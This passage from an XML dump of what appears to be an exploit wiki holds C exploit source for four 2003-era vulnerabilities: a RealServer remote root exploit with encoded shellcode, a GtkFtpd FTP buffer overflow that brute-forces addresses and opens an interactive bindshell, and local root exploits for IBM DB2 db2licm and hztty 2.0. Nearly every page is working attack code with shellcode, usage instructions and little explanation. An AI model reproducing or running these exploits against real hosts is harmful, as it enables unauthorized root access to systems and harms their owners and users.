char linuxshell[] =
"\x36\xc5\x55\x6d\xfa\x07\x7f\x6c\x8c\xe2\x55\x6f\x04\x6f\x07"
"\x8c\xe4\xb5\x63\x34\xde\x46\xc8\x85\x6f\x15\x52\x55\x8c\xe4"
"\xb5\x63\x46\xc8\x85\xb5\x63\xb6\x01\x8c\x41\x21\x01\xc8\x85"
"\x36\xc5\x86\xc1\x09\x55\x55\xb5\x63\x46\xc8\x85\x8c\xc6\x34"
"\xcc\xb4\x06\x34\xc5\xb5\x3a\x4c\xc8\x85\x44\xe7\xf3\x34\xc5"
"\x55\x6d\x2a\x2a\x76\x6d\x6d\x2a\x67\x6c\x6b\x8c\xe6\x55\x56"
"\x8c\xe4\x9c\xb5\x0e\xc8\x85";

char w32shell[] =
"\x7b\xb3\xea\xf9\x92\x95\xfc\xc9\x68\x8d\x0c\x4e\x1c\x41\xdc"
"\xe0\x44\x93\x60\xb7\xb0\xb0\xa0\x98\xc7\xc3\xa2\xcf\xa3\xa2"
"\xbe\xd4\xdc\xdc\x91\x7b\x95\x78\x69\x6f\x6f\x6f\xcd\x13\x7d"
"\xba\xfa\xa0\xc9\xf4\x1b\x91\x1b\xd0\x9c\x1b\xe0\x8c\x3d\x1b"
"\xe8\x98\x1d\xcf\xac\x1b\x8b\x91\x6b\x1b\xcb\xe8\x91\x6b\x1b"
"\xdb\x8c\x91\x69\x1b\xc3\xb4\x91\x6a\xc3\xc1\xc2\x1b\xcb\xb0"
"\x91\x6b\xa1\x59\xd1\xa1\x50\x09\x1b\xa4\x1b\x91\x6e\x3c\xa1"
"\x52\x41\x72\x14\x50\xe5\x67\x9f\x26\xd5\x95\x1d\xd4\xd5\x94"
"\xf6\xa9\x80\xe5\x71\xf6\xa1\x80\xca\xc8\xce\xc6\xc0\xc2\xbb"
"\xde\x80\xd1\x9f\x27\x9c\xda\x1b\x94\x18\x91\x68\x9f\x26\xdd"
"\x95\x19\xd4\x1d\x48\x6e\xdd\x95\xe5\x2e\x6e\xdd\x94\xe4\xb1"
"\x6e\xdd\xb2\x1d\xcd\x88\xc3\x6f\x40\x19\x57\xfa\x94\xc8\x18"
"\xd5\x95\x10\xd5\xe7\x9a\x1d\xcd\xe4\x10\xfb\xb6\x84\x79\xe8"
"\x6f\x6f\x6f\x19\x5e\xa1\x4b\xc3\xc3\xc3\xc3\xc6\xd6\xc6\x6f"
"\x40\x07\xc5\xc8\xf6\x19\xa0\xfa\x80\xc5\xc7\x6f\xc5\x44\xde"
"\xc6\xc7\x6f\xc5\x5c\xc3\xc5\xc7\x6f\xc5\x40\x07\x1d\xd5\x18"
"\xc0\x6f\xc5\x74\xc5\xc5\x6f\xc5\x78\x1d\xd4\x95\x9c\x04\xc3"
"\xf8\xbe\xf5\xe8\xf5\xf8\xcc\xf3\xfd\xf4\x04\xa1\x42\x1d\xd5"
"\x5c\x04\xc7\xc7\xc7\xc3\xc3\x6e\x56\x91\x62\xc2\x04\x1d\xd5"
"\xe8\xc0\x1d\xd5\x18\xc0\x21\x98\xc3\xc3\xfa\x80\x6e\x5e\xc2"
"\xc3\xc3\xc3\xc5\x6f\xc5\x7c\xfa\x6f\x6f\xc5\x70";

void usage();

int main(int argc, char *argv[])
{ 
unsigned short realport=554;
unsigned int sock,addr,os,rc;
unsigned char *finalbuffer,*osbuf;
struct sockaddr_in mytcp;
struct hostent * hp;
WSADATA wsaData;

printf("\nTHCREALbad v0.4 - Wind0wZ &amp; Linux remote root sploit for Realservers 8+9\n");
printf("by Johnny Cyberpunk (jcyberpunk@thehackerschoice.com)\n");

if(argc&lt;3 || argc&gt;3)
usage();

finalbuffer = malloc(2000);
memset(finalbuffer,0,2000);

strcpy(finalbuffer,attackbuffer1);
os = (unsigned short)atoi(argv[2]);
switch(os)
{
case WINDOWS:
decoder[11]=0x90;
break;
case LINUX:
decoder[11]=0x05;
break;
case OSTESTMODE:
break;
default:
printf("\nillegal OS value!\n");
exit(-1);
}

strcat(finalbuffer,decoder);

if(os==WINDOWS)
strcat(finalbuffer,w32shell);
else
strcat(finalbuffer,linuxshell);

strcat(finalbuffer,attackbuffer2);

if (WSAStartup(MAKEWORD(2,1),&amp;wsaData) != 0)
{
printf("WSAStartup failed !\n");
exit(-1);
}

hp = gethostbyname(argv[1]);

if (!hp){
addr = inet_addr(argv[1]);
}
if ((!hp) &amp;&amp; (addr == INADDR_NONE) )
{
printf("Unable to resolve %s\n",argv[1]);
exit(-1);
}

sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
if (!sock)
{ 
printf("socket() error...\n");
exit(-1);
}

if (hp != NULL)
memcpy(&amp;(mytcp.sin_addr),hp-&gt;h_addr,hp-&gt;h_length);
else
mytcp.sin_addr.s_addr = addr;

if (hp)
mytcp.sin_family = hp-&gt;h_addrtype;
else
mytcp.sin_family = AF_INET;

mytcp.sin_port=htons(realport);

rc=connect(sock, (struct sockaddr *) &amp;mytcp, sizeof (struct sockaddr_in));
if(rc==0)
{
if(os==OSTESTMODE)
{
send(sock,ostestmode,sizeof(ostestmode),0);
Sleep(1000);
osbuf = malloc(2000);
memset(osbuf,0,2000);
recv(sock,osbuf,2000,0);
if(*osbuf != '\0')
for(; *osbuf != '\0';)
{
if((isascii(*osbuf) != 0) &amp;&amp; (isprint(*osbuf) != 0))
{
if(*osbuf == '\x53' &amp;&amp; *(osbuf + 1) == '\x65' &amp;&amp; *(osbuf + 2) == '\x72' &amp;&amp; *(osbuf + 3) ==
 '\x76' &amp;&amp; *(osbuf + 4) == '\x65' &amp;&amp; *(osbuf + 5) == '\x72')
{
osbuf += 7;
printf("\nDetected OS: ");
while(*osbuf != '\n')
printf("%c", *osbuf++);
printf("\n");
break;
}
}
osbuf++;
} 
free(osbuf);
}
else
{
send(sock,finalbuffer,2000,0);
printf("\nexploit send .... sleeping a while ....\n");
Sleep(1000);
printf("\nok ... now try to connect to port 31337 via netcat !\n");
}
}
else
printf("can't connect to realserver port!\n");

shutdown(sock,1);
closesocket(sock);
free(finalbuffer);
exit(0);
}

void usage()
{
unsigned int a;
printf("\nUsage: &lt;Host&gt; &lt;OS&gt;\n");
printf("0 = Wind0wZ\n");
printf("1 = Linux\n");
printf("2 = OS Test Mode\n");
exit(0);
}

// milw0rm.com [2003-08-25]
            
&lt;/pre&gt;</text>
      <sha1>r01oyoipplqkl1za5z2xd7laxo4nid6</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2003-0755 GtkFtpd 1.0.4 遠程緩衝區溢出漏洞</title>
    <ns>0</ns>
    <id>1666</id>
    <revision>
      <id>2070</id>
      <timestamp>2021-05-03T12:37:10Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; /**********************************************************  * [ gtkftpd[v1.0.4(and below)]: remote root buffer overflow exploit. ]  *   * by: vade79/v9 v9 at fa..."</comment>
      <origin>2070</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="13916" sha1="84vvbkounuzu765fqgx9zs4jy4n5yl8" xml:space="preserve">==EXP==
&lt;pre&gt;
/**********************************************************
 * [ gtkftpd[v1.0.4(and below)]: remote root buffer overflow exploit. ]
 * 
 * by: vade79/v9 v9 at fakehalo.deadpig.org (fakehalo/realhalo) 
 * 
 * Url: 
 * http://gtkftpd.sourceforge.net/ 
 * 
 * GtkFtpd, versions v1.0.4 and below(as of this time), contain a 
 * remotely exploitable buffer overflow. the overflow occurs when 
 * GtkFtpd allocates the appropriate amount of memory to hold a 
 * filename or directory(256 bytes), but does not account for the 
 * date/user/stat prefix(~40 bytes) it prepends to the buffer. 
 * 
 * When exploited, things are made easier due to the fact that 
 * GtkFtpd does not chroot() or drop its root privileges(as are 
 * required to run the program itself) while running. And one step 
 * more easier because when the buffer is overflown it is in a child 
 * process, making it possible to brute force(not crash). 
 * 
 * Requirements to exploit: 
 * - A valid account. (user/pass, anonymous will do) 
 * - A writable directory. (usually gtkftpd makes any dir writable) 
 * 
 * Usage: 
 * # cc xgtkftpd.c -o xgtkftpd 
 * # ./xgtkftpd [-Psupcbanrd] -h hostname 
 * *
 * Exploit workings(ftp commands): 
 * MKDIR &lt;large name/causes overflow&gt; 
 * LIST -&lt;shellcode&gt; (where the overflow occurs) 
 * 
 * The exploitable code itself is found in src/sys_cmd.c: 
 * 12:#define BUF_SIZE 256 
 * 21:char buf[BUF_SIZE]; 
 * 57:sprintf(buf, "%s\t%s", perm_date_siz, entr-&gt;d_name); 
 * 
 * Note: 
 * Make sure the directory used to "LIST" does not already contain 
 * any large filenames or directories, as the first overly long one 
 * to list will cause the overflow. (which will fail the exploit) 
 * *
 * (should work out of the box on generic linux, tested on rh7.1. 
 * squished, un-tab'd, un-space'd, exploit code; just how i like it.) 
 **********************************************************/
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdarg.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;signal.h&gt;
#include &lt;getopt.h&gt;
#include &lt;ctype.h&gt;
#include &lt;time.h&gt;
#include &lt;netdb.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/time.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;arpa/inet.h&gt;
/* default definitions, change at will. */
#define DFLUSER "anonymous" /* no argument, default username. */
#define DFLPASS "null@null.com" /* no argument, default password. */
#define DFLDIR "/incoming" /* no argument, default +w directory. */
#define DFLCLM 80 /* default screen width to use. */
#define DFLADDR 0xbffffffa /* base brute address. */
#define TIMEOUT 10 /* connection timeout. */
static char x86_exec[]= /* bindshell(sport), modded from netric. */
 /* port defined in byte 20, and 21; in a 'short' cast form. */
 "\x31\xc0\x50\x40\x89\xc3\x50\x40\x50\x89\xe1\xb0\x66\xcd\x80\x31"
 "\xd2\x52\x66\x68\x00\x00\x43\x66\x53\x89\xe1\x6a\x10\x51\x50\x89"
 "\xe1\xb0\x66\xcd\x80\x40\x89\x44\x24\x04\x43\x43\xb0\x66\xcd\x80"
 "\x83\xc4\x0c\x52\x52\x43\xb0\x66\xcd\x80\x93\x89\xd1\xb0\x3f\xcd"
 "\x80\x41\x80\xf9\x03\x75\xf6\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f"
 "\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80";
/* protos/functions. */
char *getdir(unsigned int);
char *getbdir(void);
char *getcode(void);
void filter_text(char *);
void ftp_printf(int,char *,...);
void ftp_clean(int);
void ftp_read(int);
void ftp_parse(int);
void ftp_connect(void);
void getshell(int,unsigned int);
void printe(char *,short);
void usage(char *);
void sig_ctrlc(){printe("user aborted.",1);}
void sig_alarm(){printe("alarm/timeout hit.",1);}
void sig_pipe(){printe("connection closed/failed.",1);}
/* globals. (ease of use throughout) */
unsigned short align=2; /* probably will never need to be otherwise. */
unsigned short port=21; /* generic ftp daemon port. */
unsigned short sport=7979; /* generic bindshell port. */
unsigned short reverse=0; /* go upward, instead of downward */
unsigned short no_io=0; /* do not show traffic. */
unsigned int attempts=100; /* number of times to brute. */
unsigned int columns=80; /* generic screen width. */
unsigned int ftp_i=0; /* Nth time read ftp socket. */
unsigned int baseaddr=DFLADDR; /* base address. (again) */
char *host; /* hostname/target, a must have. */
char *user; /* username to use. */
char *pass; /* password to use. */
char *writedir; /* need a writable directory. */
char *basedir; /* gets filled in later. */
/* program start. */
int main(int argc,char **argv){
 int chr=0;
 printf("[*] gtkftpd[v1.0.4(and below)]: remote root buffer overflow"
 " exploit.\n[*] by: vade79/v9 v9@fakehalo.deadpig.org (fakehalo)\n\n");
 /* set the chomp point, filter long lines. */
 if(getenv("COLUMNS"))columns=atoi(getenv("COLUMNS"));
 if(7&gt;columns||columns&gt;256)columns=DFLCLM;
 while((chr=getopt(argc,argv,"h:P:s:u:p:c:b:a:n:rd"))!=EOF){
  switch(chr){
   case 'h':
    if(!host&amp;&amp;!(host=(char *)strdup(optarg)))
     printe("main(): allocating memory failed.",1);
    break;
   case 'P':
    port=atoi(optarg);
    break;
   case 's':
    sport=atoi(optarg);
    break;
   case 'u':
    if(!user&amp;&amp;!(user=(char *)strdup(optarg)))
     printe("main(): allocating memory failed.",1);
    break;
   case 'p':
    if(!pass&amp;&amp;!(pass=(char *)strdup(optarg)))
     printe("main(): allocating memory failed.",1);
    break;
   case 'c':
    if(!writedir&amp;&amp;!(writedir=(char *)strdup(optarg)))
     printe("main(): allocating memory failed.",1);
    break;
   case 'b':
    sscanf(optarg,"%x",&amp;baseaddr);
    break;
   case 'a':
    align=atoi(optarg);
    break;
   case 'n':
    attempts=atoi(optarg);
    break;
   case 'r':
    reverse=1;
    break;
   case 'd':
    no_io=1;
    break;
   default:
    usage(argv[0]);
    break; 
  }
 }
 if(!host)
  usage(argv[0]);
 /* fill in the blanks, or out of bounds. */
 if(!user)user=DFLUSER;
 if(!pass)pass=DFLPASS;
 if(!writedir)writedir=DFLDIR;
 if(!baseaddr)baseaddr=DFLADDR;
 if(align&gt;3)align=2;
 if(!((sport&amp;0xff00)&gt;&gt;8)||!(sport&amp;0x00ff)){
  printf("[!] shell port defined contains null byte(s), using default.\n");
  sport=7979; /* back to default. */
 }
 /* change the bindshell port. */
 x86_exec[20]=(sport&amp;0xff00)&gt;&gt;8;
 x86_exec[21]=(sport&amp;0x00ff);
 /* verbose. */
 printf("[*] target: %s:%d, identity: %s:%s.\n[*] directory: %s, brute"
 " start: 0x%.8x, alignment: %d.\n[*] memory direction: %s, attempts: "
 "%d, bindshell port: %d.\n\n",host,port,user,pass,writedir,baseaddr,
 align,(!reverse?"downward":"upward"),attempts,sport);
 signal(SIGINT,sig_ctrlc); /* explained/pretty exit. */
 signal(SIGPIPE,sig_pipe); /* handle abnormal disconnects. */
 ftp_connect(); /* do the magic, brute force. */
 printe("brute force exhausted, failed.",0);
 exit(0);
}
char *getdir(unsigned int offset){
 unsigned int i=0;
 char *buf;
 /* 256 will fail; 255 or less. */
 if(!(buf=(char *)malloc(255+1)))
  printe("getdir(): allocating memory failed.",1);
 memset(buf,0x0,255+1);
 if(align)memset(buf,'x',align);
 for(i=align;i&lt;252;i+=4){
 if(!reverse)*(long *)&amp;buf[i]=(baseaddr-offset);
 else *(long *)&amp;buf[i]=(baseaddr+offset);
 }
 return(buf);
}
char *getbdir(void){
 char *buf;
 time_t ttt;
 struct tm *ttm;
 if(!(buf=(char *)malloc(32+1)))
  printe("getbdir(): allocating memory failed",1);
 ttt=time(NULL);
 ttm=localtime(&amp;ttt);
 strftime(buf,32,"tmp_%H:%M:%S_%d-%m-%Y",ttm);
 return(buf);
}
char *getcode(void){
 char *buf;
 if(!(buf=(char *)malloc(512+1)))
  printe("getcode(): allocating memory failed",1);
 memset(buf,0x90,(512-strlen(x86_exec)));
 memcpy(buf+(512-strlen(x86_exec)),x86_exec,strlen(x86_exec));
 return(buf);
}
void filter_text(char *ptr){
 unsigned int i=0;
 for(i=0;i&lt;strlen(ptr);i++){
  /* keep it short and sweet. */
  if(i&gt;=(columns-3)){
   ptr[i--]=0x0;
   ptr[i--]='.';
   ptr[i--]='.';
   ptr[i]='.';
  }
  /* don't make \r or \n a '?'. */
  else if(ptr[i]=='\r'||ptr[i]=='\n')ptr[i]=0x0;
  /* don't ugly the local terminal. */
  else if(!isprint(ptr[i]))ptr[i]='?';
 }
 return;
}
void ftp_printf(int sock,char *fmt,...){
 char *buf;
 va_list ap;
 if(!(buf=(char *)malloc(1024+1)))
  printe("ftp_printf(): allocating memory failed.",1);
 memset(buf,0x0,1024+1);
 va_start(ap,fmt);
 vsnprintf(buf,1024,fmt,ap);
 va_end(ap);
 write(sock,buf,strlen(buf)); /* write it, then mod it for display. */
 filter_text(buf);
 if(!no_io)
  printf("-&gt; %s\n",buf);
 free(buf);
 return;
}
void ftp_clean(int sock){
 ftp_printf(sock,"CWD ..\r\n");
 ftp_read(sock);
 ftp_printf(sock,"RMD %s\r\n",basedir);
 ftp_read(sock);
 ftp_printf(sock,"QUIT\r\n");
 ftp_read(sock);
 return;
}
void ftp_read(int sock){
 char *buf;
 if(!(buf=(char *)malloc(1024+1)))
  printe("ftp_read(): allocating memory failed.",1);
 memset(buf,0x0,1024);
 read(sock,buf,1024);
 filter_text(buf);
 if(!no_io)
  printf("&lt;- %s\n",buf);
 /* some initial reply checking, not too much. */
 if(!ftp_i)
  if(!strstr(buf,"GtkFTPd"))
   printe("this exploit is only for GtkFTPd, failed.",1);
 if(ftp_i==2)
  if(strncmp(buf,"230",3))
   printe("invalid username/password, failed.",1);
 if(ftp_i==3)
  if(strncmp(buf,"250",3))
   printe("invalid writable directory, failed. (try \"/\")",1);
 free(buf);
 ftp_i++; /* increase the response identifier. */
 return;
}
void ftp_parse(int sock){
 unsigned int offset=0;
 ftp_read(sock); /* get the banner. */
 ftp_printf(sock,"USER %s\r\n",user);
 ftp_read(sock);
 ftp_printf(sock,"PASS %s\r\n",pass);
 ftp_read(sock);
 ftp_printf(sock,"CWD %s\r\n",writedir);
 ftp_read(sock);
 basedir=getbdir(); /* tmp dir of our own to use. */
 ftp_printf(sock,"MKD %s\r\n",basedir);
 ftp_read(sock);
 ftp_printf(sock,"CWD %s\r\n",basedir);
 ftp_read(sock);
 while(offset&lt;(attempts*400)){ /* if it hasn't yet, it's not going to. */
  /* slight null-byte/CR check, only needs to check the last byte. */
  if((!reverse&amp;&amp;!((baseaddr-offset)&amp;0xff))||(reverse&amp;&amp;!((baseaddr+offset)
  &amp;0xff))||(!reverse&amp;&amp;((baseaddr-offset)&amp;0xff)=='\n')||(reverse&amp;&amp;
  ((baseaddr+offset)&amp;0xff)=='\n')){
   printf("[!] brute address contains null-byte/CR, increasing offset "
   "by one byte.\n");
   offset++; /* one byte off if reversed won't hurt here. (401) */
  }
  /* make the evil oversized directory. (255 or less bytes) */
  ftp_printf(sock,"MKD %s\r\n",getdir(offset));
  ftp_read(sock);
  /* date+directory exceeds 256 byte buffer, the exploit. */
  sleep(1); /* delay insurance. */
  ftp_printf(sock,"LIST -%s\r\n",getcode());
  /* nothing to read here, and gtkftpd processes (the exploit) */
  /* before the ftp list connection is made, making it */
  /* pointless to view the list. */
  sleep(1); /* delay insurance, again, just to be sure. */
  /* delete directory, multiples will cause failure(s). */
  ftp_printf(sock,"RMD %s\r\n",getdir(offset));
  ftp_read(sock);
  getshell(sock,offset);
  offset+=400; /* always at least 400 nops in a row, in shellcode. */
 }
 ftp_clean(sock);
 close(sock);
 return;
}
void ftp_connect(void){
 int sock;
 struct hostent *t;
 struct sockaddr_in s;
 sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
 s.sin_family=AF_INET;
 s.sin_port=htons(port);
 if((s.sin_addr.s_addr=inet_addr(host))){
  if(!(t=gethostbyname(host)))
   printe("couldn't resolve hostname.",1);
  memcpy((char*)&amp;s.sin_addr,(char*)t-&gt;h_addr,sizeof(s.sin_addr));
 }
 printf("[*] attempting to connect: %s:%d.\n",host,port);
 signal(SIGALRM,sig_alarm);
 alarm(TIMEOUT);
 if(connect(sock,(struct sockaddr *)&amp;s,sizeof(s)))
  printe("gtkftpd connection failed.",1);
 alarm(0);
 printf("[*] connected successfully: %s:%d.\n",host,port);
 ftp_parse(sock);
 return;
}
void getshell(int ftpsock,unsigned int offset){
 int sock,r;
 fd_set fds;
 char buf[4096+1];
 struct hostent *he;
 struct sockaddr_in sa;
 if((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1)
  printe("getshell(): socket() failed.",1);
 sa.sin_family=AF_INET;
 if((sa.sin_addr.s_addr=inet_addr(host))){
  if(!(he=gethostbyname(host)))
   printe("getshell(): couldn't resolve.",1);
  memcpy((char *)&amp;sa.sin_addr,(char *)he-&gt;h_addr,sizeof(sa.sin_addr));
 }
 sa.sin_port=htons(sport);
 signal(SIGALRM,sig_alarm);
 alarm(TIMEOUT);
 printf("[*] checking for bindshell: %s:%d. (0x%.8x)\n",host,sport,
 (!reverse?(baseaddr-offset):(baseaddr+offset)));
 if(connect(sock,(struct sockaddr *)&amp;sa,sizeof(sa))){
  printf("[!] connection failed: %s:%d.\n",host,sport);
  close(sock); /* don't want fd's to fill up. */
  alarm(0);
  return;
 }
 alarm(0);
 printf("[*] successfully connected: %s:%d.\n",host,sport);
 printf("[*] attempting to cleanup leftover directory(s).\n");
 ftp_clean(ftpsock);
 close(ftpsock);
 printf("[*] entering remote shell. (%s:%d)\n\n",host,sport);
 signal(SIGINT,SIG_IGN);
 write(sock,"cd /;uname -a;id\n",18);
 while(1){
  FD_ZERO(&amp;fds);
  FD_SET(0,&amp;fds);
  FD_SET(sock,&amp;fds);
  if(select(sock+1,&amp;fds,0,0,0)&lt;1)
   printe("getshell(): select() failed.",1);
  if(FD_ISSET(0,&amp;fds)){
   if((r=read(0,buf,4096))&lt;1)
    printe("getshell(): read() failed.",1);
   if(write(sock,buf,r)!=r)
    printe("getshell(): write() failed.",1);
  }
  if(FD_ISSET(sock,&amp;fds)){
   if((r=read(sock,buf,4096))&lt;1)exit(0);
   write(1,buf,r);
  }
 }
 close(sock);
 return;
}
void printe(char *err,short e){
 printf("[!] error: %s\n",err);
 if(e)exit(1);
 return;
}
void usage(char *name){
 printf(" usage: %s [options] -h hostname\n\n options:\n"
 " -h &lt;string&gt;\tdefines the target host/ip.\t(REQUIRED)\n"
 " -P &lt;number&gt;\tdefines the target port.\t(%d)\n"
 " -s &lt;number&gt;\tdefines the bindshell port.\t(%d)\n"
 " -u &lt;string&gt;\tdefines the username.\t\t(\"%s\")\n"
 " -p &lt;string&gt;\tdefines the password.\t\t(\"%s\")\n"
 " -c &lt;string&gt;\tdefines the writable directory.\t(\"%s\")\n"
 " -b &lt;string&gt;\tdefines the base brute address.\t(0x%.8x)\n"
 " -a &lt;number&gt;\tdefines the alignment.\t\t(%d)\n"
 " -n &lt;number&gt;\tdefines the number of attempts.\t(%d)\n"
 " -r\t\tgo upward in memory, instead of downward.\n"
 " -d\t\tdo not show verbose ftp in/out traffic.\n\n",
 name,port,sport,DFLUSER,DFLPASS,DFLDIR,DFLADDR,align,attempts);
 exit(0);
}

// milw0rm.com [2003-08-28]
            
&lt;/pre&gt;</text>
      <sha1>84vvbkounuzu765fqgx9zs4jy4n5yl8</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2003-0759 IBM DB2 - Universal Database 7.2 'db2licm' 本地溢出漏洞</title>
    <ns>0</ns>
    <id>1670</id>
    <revision>
      <id>2074</id>
      <timestamp>2021-05-03T12:43:24Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; /*  	Local Exploit for db2licm  	IBM db2 v 7.1 Linux/x86   	vulnerability researched by  	Juan Manuel Pascual Escriba 	pask at uninet.edu    */    char sc[]= "\x..."</comment>
      <origin>2074</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2229" sha1="42mqpg1d6eabm2kp79co7lbe6j4nbr3" xml:space="preserve">==EXP==
&lt;pre&gt;
/* 
	Local Exploit for db2licm 
	IBM db2 v 7.1 Linux/x86 

	vulnerability researched by 
	Juan Manuel Pascual Escriba
	pask at uninet.edu


 */



char sc[]=
"\x31\xc0"      /* begin setuid (0) */
"\x31\xdb"
"\xb0\x17"
"\xcd\x80"

"\xeb\x1f"
"\x5e"
"\x89\x76\x08"
"\x31\xc0"
"\x88\x46\x07"
"\x89\x46\x0c"
"\xb0\x0b"
"\x89\xf3"
"\x8d\x4e\x08"
"\x8d\x56\x0c"
"\xcd\x80"
"\x31\xdb"
"\x89\xd8"
"\x40"
"\xcd\x80"
"\xe8\xdc\xff\xff\xff"
"/bin/sh";


#define STACK_TOP_X86 0xC0000000
#define ALG_MASK 0xfffffff4
#define ADDR 1000
#define DB2LICM "/home/db2inst1/sqllib/adm/db2licm"

#define DFL_ALG 4       

int main(int arc, char **arv){
        char *argv[3];
        char *envp[2];
        unsigned long sc_address, ba=0;
        unsigned char alg = DFL_ALG;
        unsigned long *p;
        unsigned char *q;
        unsigned int i;



        sc_address = STACK_TOP_X86 - 4 - strlen(DB2LICM) - sizeof(sc) - 1;
        printf("shellcode address = 0x%X\n",sc_address);


        if( (sc_address &amp; ALG_MASK) != sc_address ) {
                ba = sc_address - (sc_address &amp; ALG_MASK);
                printf("adding %d trailing bytes to backward align Shellcode to 0x%X\n", ba,
sc_address &amp; ALG_MASK);
                sc_address = STACK_TOP_X86 - 4 - strlen(DB2LICM) - sizeof(sc) - ba - 1;
                printf("new shellcode address = 0x%X\n",sc_address);
        }

        envp[0] = (char*)malloc(sizeof(sc)+strlen("pete=")+1+ba);
        q = envp[0];
        strcpy(q,"pete=");
        q += strlen("pete=");
        memcpy(q,sc,sizeof(sc));
        q += sizeof(sc)-1;
        memset(q,'A',ba);
        q += ba;
        *q = 0;
        envp[1] = 0;

        /* build overflowing arvg[2] */


        printf("using alignment = %d in overflow buffer\n",alg);

        argv[0] = DB2LICM;
	argv[1] = "-a";
        argv[2] = (char*)malloc(ADDR*sizeof(unsigned long)+alg+1);
        memset(argv[2],'A',alg);
        p=(unsigned long*)(argv[2]+alg);
        for(i=0;i&lt;ADDR;i++) {
                *p = sc_address;
                p++;
        };
        *p = 0;
        argv[3] = 0; 

        printf("executing %s ...\n\n",argv[0]);
        execve(argv[0],argv,envp); 


}

// milw0rm.com [2003-09-27]
            
&lt;/pre&gt;</text>
      <sha1>42mqpg1d6eabm2kp79co7lbe6j4nbr3</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2003-0783 hztty 2.0 (RedHat 9.0) 本地特權提升漏洞</title>
    <ns>0</ns>
    <id>1667</id>
    <revision>
      <id>2071</id>
      <timestamp>2021-05-03T12:38:03Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; /*  0x333hztty =&gt; hztty 2.0 local root exploit  *  *  *	more info : Debian Security Advisory DSA 385-1  *  *	*note* I adjusted some part of hztty's code since  *..."</comment>
      <origin>2071</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1410" sha1="cv73a4iiqq5glbfoxgmntaib53uqfz9" xml:space="preserve">==EXP==
&lt;pre&gt;
/*  0x333hztty =&gt; hztty 2.0 local root exploit
 *
 *
 *	more info : Debian Security Advisory DSA 385-1
 *
 *	*note* I adjusted some part of hztty's code since
 *	there were some errors. hope this will not influence
 *	exploitation :&gt; tested against Red Hat 9.0 :
 *
 * [c0wboy@0x333 c0wboy]$ gcc 0x333hztty.c -o k
 * [c0wboy@0x333 c0wboy]$ ./k
 *
 *  ---  local root exploit for hztty 2.0  ---
 *  ---  coded by c0wboy ~ 0x33  ---
 * 
 * sh-2.05b# [./hztty started]  [using /dev/ttyp6]
 * sh-2.05b$ sh-2.05b# uid=0(root) gid=0(root) groups=500(c0wboy)
 * sh-2.05b#
 *
 *  coded by c0wboy 
 *
 *  (c) 0x333 Outsiders Security Labs
 *
 */

#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;

#define BIN    "./hztty"
#define SIZE   272


unsigned char shellcode[] =
	"\x31\xdb\x89\xd8\xb0\x17\xcd\x80\x31\xdb\x89\xd8"
	"\xb0\x2e\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68"
	"\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
	"\xd2\xb0\x0b\xcd\x80" ;

int main()
{
	int i;
	char out[SIZE];
	char *own[] = { shellcode, 0x0 };

	int *hztty = (int *)(out);
	int ret = 0xbffffffa - strlen(BIN) - strlen(shellcode);

	for (i=0 ; i&lt;SIZE-1 ; i+=4)
		*hztty++ = ret;

	hztty = 0x0;

	fprintf (stdout, "\n ---  local root exploit for hztty 2.0  ---\n");
	fprintf (stdout, " ---  coded by c0wboy ~ www.0x333.org   ---\n\n");

	execle (BIN, BIN, "-I", out, 0x0, own, 0x0);
}


// milw0rm.com [2003-09-21]
            
&lt;/pre&gt;</text>
      <sha1>cv73a4iiqq5glbfoxgmntaib53uqfz9</sha1>
    </revision>
  </page>
</mediawiki>
